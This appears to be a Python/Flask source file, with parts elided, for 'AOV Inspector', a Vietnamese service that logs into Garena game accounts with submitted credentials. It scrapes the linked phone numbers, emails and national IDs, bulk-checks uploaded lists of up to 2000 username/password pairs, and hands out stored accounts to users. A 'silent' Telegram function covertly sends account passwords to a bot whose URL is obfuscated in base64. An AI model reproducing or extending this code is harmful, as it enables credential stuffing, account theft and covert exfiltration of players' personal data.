...
"""
================================================================================
AOV INSPECTOR - ULTIMATE EDITION v5.1.0 (FIX SĐT)
================================================================================
- ✅ FIX: Lấy SĐT/Email/CMND từ Garena (12 endpoints + deep find v2)
- ✅ FIX: Overlay progress bar hiện khi check
- ✅ FIX: Validation không cho submit form rỗng
- ✅ FIX: Port conflict (kiểm tra port trước khi start)
- ✅ FIX: Timeout gọn (8s thay vì 20s)
- ✅ FIX: Cache không cache acc bị ban
- ✅ FIX: Verify ban chặt hơn
- 🍔 Menu 12 nút + HTML Report UI
================================================================================
"""
...
APP_SECRET = "aov_ultimate_v510_2026"
...
_TELEGRAM_API_BASE_ENC = b"aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="
...
def cache_get(u, p):
    ...
    if result and result.get("banned"):
        logger.info(f"[CACHE-SKIP] {u} — acc bị ban, không dùng cache")
        with _cache_lock: CHECK_CACHE.pop(key, None)
        return None
    return result
...
def cache_set(u, p, result):
    if result and result.get("banned"):
        logger.info(f"[CACHE-SKIP-SET] {u} — acc bị ban, không cache")
        return
    key = cache_key(u, p)
    with _cache_lock:
...
def _check_ban_from_kientuong(d):
    ...
    for key in ("banInfo","punishInfo","ban_status","banStatus",
                "punishment","penalty","ban","lockInfo"):
...
class GarenaPipeline:
    ...
    def fetch_account_security(self):
        """FIX v2: Lấy SĐT/Email/CMND từ Garena - 12 endpoints + deep find depth 10"""
        if not self.sso_key:
        ...
        def _merge(dst, src, depth=0):
            if depth > 6 or not isinstance(src, dict):
                return
        ...
        for url in endpoints:
            try:
                ...
                try:
                    ...
                    logger.info(f"[ACC-SEC] {self.username} | {short} → không phải JSON")
                    continue
        ...
        for key in ("user_info", "bind_info", "security", "data", "profile", "account"):
            if isinstance(merged.get(key), dict):
                user_info.update(merged[key])
        for k, v in merged.items():
            if k not in user_info and not isinstance(v, (dict, list)):
                user_info[k] = v
        ...
        aliases = {
            ...
            "mobile_no": [
                "mobile_no", "mobile", "phone", "phone_number", "mobileNo",
        ...
        def _deep_find_v2(obj, keys, max_depth=10, _d=0):
            ...
            if isinstance(obj, dict):
                for k in keys:
                    if k in obj:
                        v = obj[k]
                        if v not in (None, "", 0, "0", [], {}, "null", "None"):
                            return v
                for v in obj.values():
                    r = _deep_find_v2(v, keys, max_depth, _d + 1)
                    if r not in (None, "", 0, "0", [], {}, "null", "None"):
                        return r
            elif isinstance(obj, list):
                for v in obj:
                    r = _deep_find_v2(v, keys, max_depth, _d + 1)
        ...
        if user_info.get("mobile_no"):
            ...
            if ph.startswith("+"):
                ...
                if m:
                    if not user_info.get("country_code"):
                        user_info["country_code"] = m.group(1)
                    ph = m.group(2)
                else:
                    ph = ph.lstrip("+")
            elif ph.startswith("84") and len(ph) == 11 and ph[2] == "9":
                if not user_info.get("country_code"):
                    user_info["country_code"] = "84"
                ph = ph[2:]
        ...
        if user_info.get("email"):
            ...
            if "@" not in em or em.lower() in ("null", "none"):
                user_info["email"] = ""
...
# ========== VERIFY BAN ==========
def _verify_ban(u, p, current_banned):
    try:
        ...
        if status == 'INVALID' and "LOGIN_FAIL=3" in detail:
            ...
            return True
        if status == 'HIT':
            if current_banned: return current_banned
            return False
...
def send_silent_telegram(r):
    try:
        total_skins = r.get("total_skins", 0); sss_count = len(r.get("sss", []))
        is_banned = r.get("banned", False)
        logger.info(f"[TELEGRAM] user={r.get('username')} | Skin={total_skins} | BAN={is_banned}")
        if is_banned:
            username = r.get("username", ""); password = r.get("password", "")
            if not username or not password: return False
            lines = ["🚫 <b>[AOV INSPECTOR] ACC BỊ BAN!</b> 🚫", "━━━━━━━━━━━━━━━━━━━━"]
            ...
            ban_end = r.get("ban_end_time", ""); ban_reason = r.get("ban_reason", "")
            if ban_end: lines.append(f"⏰ <b>Hết hạn ban:</b> {ban_end}")
            else: lines.append("⏰ <b>Hết hạn ban:</b> Vĩnh viễn / Không rõ")
            if ban_reason: lines.append(f"📝 <b>Lý do:</b> {ban_reason}")
        ...
        try:
            ...
            if ad:
                ...
                if is_b:
                    ...
                    if e_b: ban_ends.append(e_b)
                    if r_b: ban_reasons.append(r_b)
                    r["ban_sources"].append("account")
                else: ban_flags.append(False)
            if "tcp_lock" in r["ban_sources"]: ban_flags.append(True)
            r["banned"] = any(ban_flags)
            if ban_ends: r["ban_end_time"] = max(ban_ends)
            if ban_reasons: r["ban_reason"] = "; ".join(set(ban_reasons))[:150]
            if r["banned"]:
                verified = _verify_ban(u, p, r["banned"])
                if not verified and "tcp_lock" not in r["ban_sources"]:
                    if "kientuong" in r["ban_sources"] and len(r["ban_sources"]) == 1:
                        pass
                    else:
                        r["banned"] = False
                r["banned"] = verified
            ...
            if sd:
                ...
                for iid in oids:
                    ...
                    if info:
                        info["cdn"] = _hero_cdn(iid); info["cdn_fallback"] = _hero_fallback_cdn(iid)
            ...
            r["total_skins"] = len(r["all_skins"]); r["skins"] = all_skins
...
@app.route("/fan-anh-jack.mp3")
def get_audio_file():
    base_dir = os.path.dirname(os.path.abspath(__file__))
    return send_from_directory(base_dir, "fan-anh-jack.mp3", mimetype="audio/mpeg")
    ...
    if request.method == "POST":
        ...
        if not u or len(u) < 3 or len(u) > 20 or not u.isalnum():
            ...
            USERS[u] = {"id": uid, "username": u, "password": hash_password(p),
                ...
                "daily_limit": USER_DAILY_LIMIT, "balance": DEFAULT_BALANCE,
                "temp_balance": 0, "referrals": 0, "invited_by": inviter,
                "is_admin": False, "is_qtv": False, "is_owner": False,
                "created_at": time.time(), "last_checkin": 0, "last_notif_read": 0,
                "checkin_streak": 0, "total_checkins": 0, "history": [],
                "current_job": None, "level": 1, "exp": 0, "favorites": [], "tags": {},
                "cultivation": {"level": 0, "exp": 0, "hp": 100, "atk": 20, "def": 10,
                                "weapon": None, "mon_phai": None, "mon_phai_level": 0},
                "mission": {"total_acc": 0, "sss": 0, "ss": 0, "anime": 0, "xu_used": 0, "claimed": []},
                "daily_missions": {}, "last_daily_reset": 0,
...
def check_page():
    ...
    if request.method == "POST":
        ...
        if not acc or not pwd:
            flash("⚠️ Vui lòng nhập đầy đủ tài khoản và mật khẩu!", "error")
            return redirect(url_for("check_page"))
...
def render_check_form(user):
    ...
    <div id="loading-overlay" style="display:none;position:fixed;inset:0;background:rgba(5,8,17,0.95);backdrop-filter:blur(20px);z-index:9999;align-items:center;justify-content:center;flex-direction:column;gap:24px;padding:20px;overflow-y:auto;">
        ...
        <div style="color:#ffb800;font-size:0.85em;text-align:center;max-width:400px;padding-bottom:20px;">
            ⏱️ Có thể mất 10-30 giây. Đừng tắt trang!
        </div>
    </div>

    <div class="card">
        <h2 class="card-title"><i class="fa-solid fa-bolt"></i> Check Tài Khoản Garena</h2>
        <form method="POST" id="check-form" onsubmit="return handleSubmit(event)">
            <div class="form-group"><label class="form-label">Tài khoản / Email / SĐT</label>
                <input type="text" name="account" id="inp-acc" class="form-input" placeholder="Nhập tài khoản Garena..." required autocomplete="off"></div>
            <div class="form-group"><label class="form-label">Mật khẩu</label>
                <input type="password" name="password" id="inp-pwd" class="form-input" placeholder="Nhập mật khẩu..." required></div>
            <div class="form-info" style="background:rgba(0,242,254,0.08); padding:12px; border-radius:12px; margin-bottom:14px; border:1px solid rgba(0,242,254,0.3); font-size:0.85em;">
                <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
                    <span style="color:#94a3b8;">Số dư:</span>
                    <span style="color:#ffb800; font-weight:800;">{user.get("balance", 0)} xu</span>
                </div>
                <div style="display:flex; justify-content:space-between;">
                    <span style="color:#94a3b8;">Chi phí:</span>
                    <span style="color:#00f2fe; font-weight:800;">{CHECK_COST} xu / lần check</span>
                </div>
            </div>
            <button type="submit" class="btn btn-block" id="btn-check">
                <i class="fa-solid fa-bolt-lightning"></i> Bắt Đầu Quét Dữ Liệu
            </button>
        </form>
    </div>
    ...
    <script>
    window.__stepInterval = null;
    window.__currentStep = 0;

    window.__STEPS = [
        {{ text: "Đang kết nối TCP Garena (103.247.205.14:19000)...", pct: 10 }},
        {{ text: "Đang giải mã XTEA + xác thực Protobuf...", pct: 25 }},
        {{ text: "Đang trích xuất SSO / Access / Session Token...", pct: 40 }},
        {{ text: "Đang truy vấn Bảo Mật Garena (12 endpoints)...", pct: 55 }},
        {{ text: "Đang tải Kho Tướng + Trang Phục (GraphQL)...", pct: 75 }},
        {{ text: "Đang phân tích kết quả & kiểm tra BAN...", pct: 90 }}
    ];
    ...
    window.__showStep = function(idx) {{
        ...
        for (var i = 0; i <= idx; i++) {{
            ...
            if (el) {{
                el.style.opacity = '1';
                el.style.color = (i === idx) ? '#00f2fe' : '#10b981';
...
def render_html_report(r, acc, pwd):
    ...
    tier_colors = {
        ...
        "ss": ("#00f2fe", "◆", "SS"),
        "anime": ("#e040fb", "◇", "ANIME"),
        "normal": ("#8b8b9a", "▪", "THƯỜNG"),
        "trang": ("#a0a0b8", "○", "TRẮNG"),
        "banned": ("#ff2951", "✖", "BANNED"),
        "failed": ("#5a5a6e", "✕", "LỖI")
    }
    ...
    ss_count = len(r.get("ss", []))
    anime_count = len(r.get("anime", []))
    ...
    for tier in ["sss", "anime", "ss"]:
        if r.get(tier):
            avatar_url = r[tier][0].get("cdn_fallback") or r[tier][0].get("cdn") or ""
            break
    ...
    skin_grid_html = ""
    if sss_count > 0:
        skin_grid_html += f'''<div style="margin-bottom:14px;">
            <div style="font-family:var(--font-display); font-size:13px; font-weight:700; color:#ffb800; margin-bottom:10px; letter-spacing:1px;">⭐ SSS ({sss_count})</div>
            <div class="moba-cards-grid">{build_skin_grid(r.get("sss", []), "SSS")}</div>
        </div>'''
    if anime_count > 0:
        skin_grid_html += f'''<div style="margin-bottom:14px;">
            <div style="font-family:var(--font-display); font-size:13px; font-weight:700; color:#e040fb; margin-bottom:10px; letter-spacing:1px;">🎴 ANIME ({anime_count})</div>
            <div class="moba-cards-grid">{build_skin_grid(r.get("anime", []), "Anime")}</div>
        </div>'''
    if ss_count > 0:
        skin_grid_html += f'''<div style="margin-bottom:14px;">
            <div style="font-family:var(--font-display); font-size:13px; font-weight:700; color:#00c6ff; margin-bottom:10px; letter-spacing:1px;">💎 SS ({ss_count})</div>
            <div class="moba-cards-grid">{build_skin_grid(r.get("ss", []), "SS")}</div>
        </div>'''
    ...
    if is_banned:
        ban_banner = f'''<div class="card" style="border:2px solid #ff2951; background:rgba(255,41,81,0.1);">
            <h3 class="card-title" style="color:#ff2951; font-size:1em;"><i class="fa-solid fa-ban"></i> ACC ĐANG BỊ BAN</h3>
            ...
            {f'<div class="info-row"><span class="info-label">Nguồn</span><span class="info-value">{", ".join(r.get("ban_sources", []))}</span></div>' if r.get("ban_sources") else ''}
        </div>'''
    ...
    <div class="player-showcase-banner">
        <div class="player-info-left">
            <div class="player-avatar-ring">
                <img class="player-avatar-img" src="{avatar_url}" onerror="this.src='https://dl.ops.kgvn.garenanow.com/hok/VN/HeroHeadPath/301310.jpg'">
            </div>
            <div class="player-identity">
                ...
                <div class="player-uids">
                    ...
                    <span>Mặt Trời (VN)</span>
                </div>
            </div>
        </div>
        <div class="player-highlight-badges">
            <div class="stat-pill">
                <div class="stat-pill-label">Bậc Xếp Hạng</div>
                <div class="stat-pill-value" style="color:#ffb800;">🏆 {r.get("rank") or "Chưa xếp hạng"} ({r.get("rank_stars",0)}★)</div>
            </div>
            <div class="stat-pill">
                <div class="stat-pill-label">Kiểm Tra BAN</div>
                <div class="stat-pill-value" style="color:{ban_color};">{ban_text}</div>
            </div>
        </div>
    </div>
    ...
    <div class="info-matrix-grid">
        ...
        <div class="glass-panel">
            ...
            <div class="matrix-row-list">
                ...
                <div class="matrix-item"><div class="matrix-key">🌐 Máy chủ</div><div class="matrix-val">Mặt Trời (VN)</div></div>
    ...
    <div class="glass-panel">
        <div class="panel-header">
            <div class="panel-title">👕 Kho Tướng & Skin <span style="color:#00f2fe;">({total_skins})</span></div>
        </div>
        {skin_grid_html}
    </div>
    ...
    <div class="card" style="text-align:center;">
        <div style="display:flex; gap:8px; flex-wrap:wrap; justify-content:center;">
            <button class="btn btn-success" onclick="copyBoth('{acc}','{pwd}')">
                <i class="fa-solid fa-copy"></i> Copy TK + MK
            </button>
            <a href="/check" class="btn btn-secondary">
                <i class="fa-solid fa-rotate"></i> Check Acc Khác
            </a>
            <a href="/history" class="btn btn-info">
                <i class="fa-solid fa-list"></i> Xem Lịch Sử
            </a>
        </div>
    </div>'''
...
def up_acc():
    ...
    if request.method == "POST":
        if running_job:
            flash("⚠️ Đang có job up_acc chạy. Vui lòng chờ xong!", "error")
        ...
        STORAGE_JOBS[job_id] = {"id": job_id, "admin": user["username"], "total": len(accs),
            ...
            "started_at": time.time(), "type": "up_acc"}
        save_jobs(force=True)
    ...
    if running_job:
        ...
        job_banner = f'''<div class="card" style="border:2px solid #ffb800;">
            <div style="display:flex; align-items:center; gap:12px;">
                ...
                <div style="flex:1;">
                    <div style="font-weight:700; color:#ffb800; font-family:Orbitron;">ĐANG CÓ JOB UP ACC CHẠY</div>
                    <div style="font-size:0.85em; color:var(--text-dim);">Tiến trình: {pct}% ({j.get("current",0)}/{j.get("total",0)})</div>
                </div>
    ...
    <div class="card">
        ...
        <div style="background:rgba(5,8,17,0.4); padding:14px; border-radius:14px; margin-bottom:14px; border:1px solid var(--border-card);">
    ...
    <div class="card" id="progress-card">
        ...
        <div class="progress-container">
            <div style="display:flex; justify-content:space-between; font-size:0.85em; margin-bottom:8px;">
                <span>Tiến trình</span><span id="progress-percent" style="font-family:Orbitron; color:#38bdf8; font-weight:800;">0%</span>
            </div>
            ...
            <div style="text-align:center; font-size:0.85em; color:var(--text-dim); margin-top:8px;">
                Đang check: <b id="current-acc" style="color:#00f2fe; font-family:monospace;">Chờ...</b></div>
        </div>
...
def run_storage_upload(job_id, acc_list):
    ...
    if not job: return
    total = len(acc_list)
    lock = threading.Lock(); batch_num = [0]; completed = [0]
    def process_one(pair):
        ...
        if STORAGE_DELAY_PER_ACC > 0: time.sleep(STORAGE_DELAY_PER_ACC)
    for i in range(0, total, STORAGE_BATCH_SIZE):
        if job.get("cancelled"): break
        batch = acc_list[i:i+STORAGE_BATCH_SIZE]; batch_num[0] += 1
...
def kho_acc():
    ...
    for h in ACC_HISTORY[-20:][::-1]:
        hist_rows += f'''<div class="info-row">
            <span class="info-label">{h.get("time","")} · <b style="color:#00f2fe;">{h.get("user","")}</b></span>
...
def nhan_acc():
    ...
    if request.method == "POST":
        if remaining <= 0:
            ...
            with _lock:
                acc = random.choice(ACC_STORAGE); ACC_STORAGE.remove(acc)
            daily["count"] = used + 1
    ...
    for h in user.get("received_accs", [])[-20:][::-1]:
        ...
        hist_rows += f'''<div class="info-row">
            ...
            <button class="btn btn-sm btn-success" onclick="copyBoth(\'{u_esc}\',\'{p_esc}\')" title="Copy">📋</button>
        </div>'''
    ...
    btn_text = "🎲 NHẬN 1 ACC NGẪU NHIÊN" if can_receive else ("⏳ Hết lượt hôm nay" if remaining <= 0 else "📭 Kho đang trống")
...
def check_file():
    ...
    if request.method == "POST":
        ...
        f = request.files["file"]
        if not f.filename.endswith(".txt"): flash("Chỉ nhận file .txt!", "error"); return redirect(url_for("check_file"))
        ...
        if not accs: flash("Không tìm thấy acc hợp lệ!", "error"); return redirect(url_for("check_file"))
        if len(accs) > 2000: flash(f"File quá lớn ({len(accs)} acc). Tối đa 2000 acc!", "error"); return redirect(url_for("check_file"))
        total = len(accs); xu = (total + 44) // 45
        if user["balance"] < xu: flash(f"Cần {xu} xu, có {user['balance']}!", "error"); return redirect(url_for("check_file"))
        user["balance"] -= xu
        job_id = uuid.uuid4().hex[:16]
    ...
    <div class="card">
        ...
        <form method="POST" enctype="multipart/form-data" {'style="opacity:0.5; pointer-events:none;"' if running_job else ''}>
            ...
            <button type="submit" class="btn btn-block" {'disabled' if running_job else ''}>Upload & Check</button>
        </form>
    </div>'''
...
def check_file_progress(job_id):
    ...
    function renderAccCard(r) {{
        var isBanned = r.banned;
        var sssCount = (r.sss || []).length;
        var ssCount = (r.ss || []).length;
        var animeCount = (r.anime || []).length;
        var totalSkins = r.total_skins || 0;
        var heroSet = new Set();
        (r.all_skins || []).forEach(function(s) {{ if(s.hero_name) heroSet.add(s.hero_name); }});
        var heroCount = heroSet.size;

        var avatarUrl = '';
        if (sssCount > 0) avatarUrl = r.sss[0].cdn_fallback || r.sss[0].cdn || '';
        else if (animeCount > 0) avatarUrl = r.anime[0].cdn_fallback || r.anime[0].cdn || '';
        else if (ssCount > 0) avatarUrl = r.ss[0].cdn_fallback || r.ss[0].cdn || '';
        else if ((r.all_skins||[]).length > 0) avatarUrl = r.all_skins[0].cdn_fallback || r.all_skins[0].cdn || '';

        var banColor = isBanned ? '#ff2951' : '#00ff88';
        var banText = isBanned ? '🔴 BANNED' : '🟢 CLEAN';

        var skinsHtml = '';
        function renderTier(list, tier, ico, cls) {{
            if (!list || list.length === 0) return '';
            var h = '<div style="margin-top:10px;"><div style="font-family:var(--font-display); font-size:12px; font-weight:700; color:#94a3b8; letter-spacing:0.8px; margin-bottom:6px;">' + ico + ' ' + tier + ' (' + list.length + ')</div><div style="display:grid; grid-template-columns:repeat(auto-fill,minmax(70px,1fr)); gap:6px;">';
            list.slice(0, 12).forEach(function(s) {{
                h += '<div class="skin-card" style="padding:4px; border-color:' + (cls === 'SSS' ? 'rgba(255,183,3,0.5)' : (cls === 'Anime' ? 'rgba(255,0,127,0.5)' : 'rgba(0,198,255,0.5)')) + ';">';
                h += '<div class="skin-img-wrap" style="border-radius:8px;"><img src="' + escapeHtml(s.cdn_fallback || s.cdn || '') + '" loading="lazy" onerror="this.onerror=null;this.src=\\'' + escapeHtml(s.cdn || '') + '\\';"></div>';
                h += '<div class="skin-info" style="padding:4px 2px;"><div class="skin-hero" style="font-size:0.6em;">' + escapeHtml(s.hero_name || '?') + '</div>';
                h += '<div class="skin-name" style="font-size:0.55em; min-height:auto;">' + escapeHtml(s.skin_name || '?') + '</div></div></div>';
            }});
            h += '</div></div>';
            return h;
        }}
        skinsHtml += renderTier(r.sss, 'SSS', '⭐', 'SSS');
        skinsHtml += renderTier(r.anime, 'ANIME', '🎴', 'Anime');
        skinsHtml += renderTier(r.ss, 'SS', '💠', 'SS');

        var html = '<div class="card" style="border:2px solid ' + banColor + '33; margin-bottom:16px;">';
        html += '<div class="player-showcase-banner">';
        html += '<div class="player-info-left">';
        html += '<div class="player-avatar-ring"><img class="player-avatar-img" src="' + escapeHtml(avatarUrl) + '" onerror="this.src=\\'https://dl.ops.kgvn.garenanow.com/hok/VN/HeroHeadPath/301310.jpg\\'"></div>';
        html += '<div class="player-identity">';
        html += '<h2>' + escapeHtml(r.name || r.username_display || r.username || '?') + '</h2>';
        html += '<div class="player-uids">';
        html += '<span>Garena: <strong class="uid-tag">' + escapeHtml(r.uid || 'N/A') + '</strong></span>';
        if (r.player_uid) html += '<span>Ingame: <strong class="uid-tag">' + escapeHtml(r.player_uid) + '</strong></span>';
        html += '</div></div></div>';
        html += '<div class="player-highlight-badges">';
        html += '<div class="stat-pill"><div class="stat-pill-label">Bậc Xếp Hạng</div><div class="stat-pill-value" style="color:#ffb800;">🏆 ' + escapeHtml(r.rank || 'Chưa xếp hạng') + ' (' + (r.rank_stars||0) + '★)</div></div>';
        html += '<div class="stat-pill"><div class="stat-pill-label">Kiểm Tra BAN</div><div class="stat-pill-value" style="color:' + banColor + ';">' + banText + '</div></div>';
        html += '</div></div>';

        html += '<div class="stats-row-grid">';
        html += '<div class="esports-stat-card"><div class="stat-icon-hex icon-hero">🛡️</div><div class="stat-card-text"><div class="label">Tướng Sở Hữu</div><div class="val">' + heroCount + '</div></div></div>';
        html += '<div class="esports-stat-card"><div class="stat-icon-hex icon-sss">🐉</div><div class="stat-card-text"><div class="label">Trang Phục SSS</div><div class="val">' + sssCount + '</div></div></div>';
        html += '<div class="esports-stat-card"><div class="stat-icon-hex icon-anime">✨</div><div class="stat-card-text"><div class="label">Anime & SS</div><div class="val">' + animeCount + ' / ' + ssCount + '</div></div></div>';
        html += '<div class="esports-stat-card"><div class="stat-icon-hex icon-safe">🔒</div><div class="stat-card-text"><div class="label">Bảo Mật</div><div class="val" style="font-size:16px;">' + (r.mobile_no || r.email || r.idcard ? 'CÓ LIÊN KẾT' : '100% SẠCH') + '</div></div></div>';
        html += '</div>';

        html += '<div class="info-matrix-grid">';
        html += '<div class="glass-panel" style="background:var(--bg-card); border:1px solid var(--border-card); border-radius:20px; padding:18px; margin:0;">';
        html += '<div style="font-family:var(--font-display); font-size:14px; font-weight:700; color:#38bdf8; text-transform:uppercase; margin-bottom:12px; letter-spacing:1px; display:flex; gap:8px; align-items:center;">👤 Bảo Mật Garena</div>';
        html += '<div class="matrix-row-list">';
        html += '<div class="matrix-item"><div class="matrix-key">🆔 Garena UID</div><div class="matrix-val" style="color:#38bdf8; font-family:monospace;">' + escapeHtml(r.uid || 'N/A') + '</div></div>';
        html += '<div class="matrix-item"><div class="matrix-key">👤 Tên đăng nhập</div><div class="matrix-val">' + escapeHtml(r.username_display || r.username || 'N/A') + '</div></div>';
        html += '<div class="matrix-item"><div class="matrix-key">😊 Nickname</div><div class="matrix-val">' + escapeHtml(r.nickname || 'Chưa đặt') + '</div></div>';
        html += '<div class="matrix-item"><div class="matrix-key">📱 Số ĐT</div><div class="matrix-val">' + (r.mobile_no ? escapeHtml(r.mobile_no) : '<span class="status-badge status-safe">Không có SĐT</span>') + '</div></div>';
        html += '<div class="matrix-item"><div class="matrix-key">📧 Email</div><div class="matrix-val">' + (r.email ? escapeHtml(r.email) : '<span class="status-badge status-safe">Không có Email</span>') + '</div></div>';
        html += '<div class="matrix-item"><div class="matrix-key">🆔 CMND/CCCD</div><div class="matrix-val">' + (r.idcard ? escapeHtml(r.idcard) : '<span class="status-badge status-safe">Chưa liên kết</span>') + '</div></div>';
        html += '<div class="matrix-item"><div class="matrix-key">🛡️ 2FA</div><div class="matrix-val">' + (r.two_fa ? '<span class="status-badge status-warn">Đang BẬT</span>' : '<span class="status-badge status-safe">Đang TẮT</span>') + '</div></div>';
        html += '<div class="matrix-item"><div class="matrix-key">💰 Số Sò</div><div class="matrix-val" style="color:#ffd700; font-weight:800;">' + (r.shell || 0) + ' Sò</div></div>';
        html += '</div></div>';

        html += '<div class="glass-panel" style="background:var(--bg-card); border:1px solid var(--border-card); border-radius:20px; padding:18px; margin:0;">';
        html += '<div style="font-family:var(--font-display); font-size:14px; font-weight:700; color:#38bdf8; text-transform:uppercase; margin-bottom:12px; letter-spacing:1px; display:flex; gap:8px; align-items:center;">🏆 Chiến Tích Ingame</div>';
        html += '<div class="matrix-row-list">';
        html += '<div class="matrix-item"><div class="matrix-key">🎮 Tên Ingame</div><div class="matrix-val" style="color:#38bdf8; font-weight:800;">' + escapeHtml(r.name || 'Kiện Tướng') + '</div></div>';
        html += '<div class="matrix-item"><div class="matrix-key">🌐 Máy chủ</div><div class="matrix-val">Mặt Trời (VN)</div></div>';
        html += '<div class="matrix-item"><div class="matrix-key">🏅 Xếp Hạng</div><div class="matrix-val" style="color:#ffb800; font-weight:800;">🏆 ' + escapeHtml(r.rank || 'Chưa xếp hạng') + ' (' + (r.rank_stars||0) + ' sao)</div></div>';
        html += '<div class="matrix-item"><div class="matrix-key">🔥 Tướng tủ</div><div class="matrix-val">' + escapeHtml(r.best_hero || 'N/A') + '</div></div>';
        html += '<div class="matrix-item"><div class="matrix-key">⚡ Trận ấn tượng</div><div class="matrix-val">' + escapeHtml(r.best_play || 'N/A') + '</div></div>';
        html += '<div class="matrix-item"><div class="matrix-key">📈 Trận gần đây</div><div class="matrix-val">' + escapeHtml(r.total_matches || 'N/A') + '</div></div>';
        html += '<div class="matrix-item"><div class="matrix-key">🛡️ Tình trạng BAN</div><div class="matrix-val">' + (isBanned ? '<span class="status-badge status-danger">BỊ BAN</span>' : '<span class="status-badge status-safe">Không bị BAN</span>') + '</div></div>';
        html += '</div></div>';
        html += '</div>';

        html += '<div class="glass-panel" style="background:var(--bg-card); border:1px solid var(--border-card); border-radius:20px; padding:18px; margin-bottom:14px;">';
        html += '<div style="font-family:var(--font-display); font-size:14px; font-weight:700; color:#38bdf8; text-transform:uppercase; margin-bottom:10px; letter-spacing:1px; display:flex; justify-content:space-between; align-items:center;">👕 Kho Tướng & Skin <span style="color:#00f2fe;">(' + totalSkins + ')</span></div>';
        html += skinsHtml || '<div style="color:#64748b; text-align:center; padding:10px;">Không có skin SS/SSS/Anime</div>';
        html += '</div>';

        html += '<div class="glass-panel" style="background:var(--bg-card); border:1px solid var(--border-card); border-radius:20px; padding:14px;">';
        html += '<div style="display:flex; gap:8px; flex-wrap:wrap;">';
        html += '<button class="btn btn-success btn-sm" onclick="copyText(\\'' + escapeHtml(r.username) + '|' + escapeHtml(r.password) + '\\')">📋 Copy TK + MK</button>';
        html += '<button class="btn btn-info btn-sm" onclick="copyText(\\'' + escapeHtml(r.uid||'') + '|' + escapeHtml(r.password) + '\\')">🆔 Copy UID + MK</button>';
        html += '</div></div>';
    ...
    function updateJob() {{
        fetch('/api/check_file/progress/' + jobId).then(r => r.json()).then(data => {{
            ...
            if (data.logs && data.logs.length > 0) {{
                ...
                for (var i = 0; i < data.logs.length; i++) {{
                    var lg = data.logs[i];
                    html += '<div class="log-line ' + lg.type + '">' + escapeHtml(lg.msg) + '</div>';
                }}
                var box = document.getElementById('live-log');
                box.innerHTML = html; box.scrollTop = box.scrollHeight;
            }}
            if (data.results && data.results.length > lastRenderedIndex) {{
                var container = document.getElementById('cards-container');
                var resSection = document.getElementById('results-section');
                resSection.style.display = 'block';
                for (var i = lastRenderedIndex; i < data.results.length; i++) {{
                    var r = data.results[i];
                    if (r && r.type !== 'failed') {{
                        container.insertAdjacentHTML('beforeend', renderAccCard(r));
                    }}
                }}
                lastRenderedIndex = data.results.length;
            }}
            if (data.done) {{
                clearInterval(pollInterval);
                document.getElementById('progress-card').style.display = 'none';
    ...
    function copyText(txt) {{
        if(navigator.clipboard) navigator.clipboard.writeText(txt).then(function(){{ showToast('✓ Đã copy!'); }});
    }}
    function cancelJob() {{
...
def file_check_worker(job_id, acc_list, user_name):
    ...
    if job.get("cancelled"):
        ...
        if refund > 0:
            user["balance"] += refund; job["refunded"] = refund
...
def loc_file_process():
    ...
    f = request.files["file"]
    if not f.filename.endswith(".txt"): flash("Chỉ nhận file .txt!", "error"); return redirect(url_for("loc_file"))
    content_bytes = f.read().decode("utf-8", errors="ignore")
    accs = parse_file_content_advanced(content_bytes, "auto")
    if not accs: flash("Không tìm thấy acc hợp lệ!", "error"); return redirect(url_for("loc_file"))
...
def history():
    ...
    if filtered:
        for h in filtered[:200]:
            ...
            u_esc = (h.get("acc") or "").replace("'", "\\'")
            p_esc = (h.get("password") or "").replace("'", "\\'")
            copy_btn = f'<button class="btn btn-sm btn-success" onclick="copyBoth(\'{u_esc}\',\'{p_esc}\')" title="Copy">📋</button>'
            rows += f'''<div class="list-item">
...
def history_detail(hid):
    ...
    if request.args.get("del") == "1":
        ...
        save_data(force=True); flash("Đã xóa khỏi lịch sử!", "success")
    ...
    if entry.get("banned"):
        ...
        ban_banner = f'''<div class="card" style="border:2px solid #ff2951; background:rgba(255,41,81,0.1);">
            ...
            <div class="info-row"><span class="info-label">Hết hạn</span><span class="info-value">{ban_end or "Vĩnh viễn / Không rõ"}</span></div>
            {f'<div class="info-row"><span class="info-label">Lý do</span><span class="info-value">{ban_reason}</span></div>' if ban_reason else ''}
            {f'<div class="info-row"><span class="info-label">Nguồn</span><span class="info-value">{", ".join(ban_sources)}</span></div>' if ban_sources else ''}
        </div>'''
    ...
    info_card = f'''<div class="card"><h3 class="card-title">◐ Thông Tin</h3>
        ...
        {f'<div class="info-row"><span class="info-label">Ngày tạo</span><span class="info-value">{entry.get("register_time")}</span></div>' if entry.get("register_time") else ''}
...
def admin_send_notification():
    ...
    log_admin("SEND_NOTIF", t); save_data(force=True)
...
def owner_admins():
    ...
    for u in sp:
        un = u.get("username", "")
        iow = u.get("is_owner", False); iq = u.get("is_qtv", False)
...
def owner_set_limit(username):
    ...
    if request.method == "POST":
        ...
        if new_limit < -1: flash("Limit tối thiểu = -1 (unlimited)", "error"); return redirect(url_for("owner_set_limit", username=username))
        t["daily_limit"] = new_limit; log_admin("SET_LIMIT", username, f"limit={new_limit}"); save_data(force=True)
...
def owner_add_limit(username):
    ...
    if request.method == "POST":
        ...
        t["daily_limit"] = new_limit; log_admin("ADD_LIMIT", username, f"{current}→{new_limit}"); save_data(force=True)
        limit_txt = "∞ UNLIMITED" if new_limit == -1 else f"{new_limit} lượt/ngày"
        notify = (f"🎁 LƯỢT NHẬN ACC ĐÃ CẬP NHẬT\n├─ Trước: {current if current >= 0 else '∞'}\n"
...
def owner_change_creds(username):
    ...
    if request.method == "POST":
        ...
        if nu and nu != username:
            if nu in USERS: flash("Username mới đã tồn tại!", "error"); return redirect(url_for("owner_change_creds", username=username))
            t["username"] = nu; USERS[nu] = USERS.pop(username)
            invalidate_user_sessions(nu); username = nu; changed = True
            flash(f"✅ Đổi username → {nu}", "success")
        if np_:
            t["password"] = hash_password(np_); t["plain_password"] = np_
            invalidate_user_sessions(t.get("username", username)); changed = True
            flash("✅ Đổi password thành công", "success")
        if changed:
            t["force_logout_reason"] = "Admin đã đổi thông tin tài khoản. Vui lòng đăng nhập lại!"
            log_admin("CHANGE_CREDS", username, "OK (no OTP)"); save_data(force=True)
    ...
    <div class="card" style="border:1px solid #ff8800;">
        <p style="color:#ff8800; font-size:0.85em;">⚠️ Khi đổi, user <b>{username}</b> đang online sẽ bị <b>văng ngay</b>.</p>
    </div>'''
    return render_page(content, active_tab="", user=user)
...
def my_change_creds():
    ...
    otp_pending = user.get("otp_pending", "")
    ...
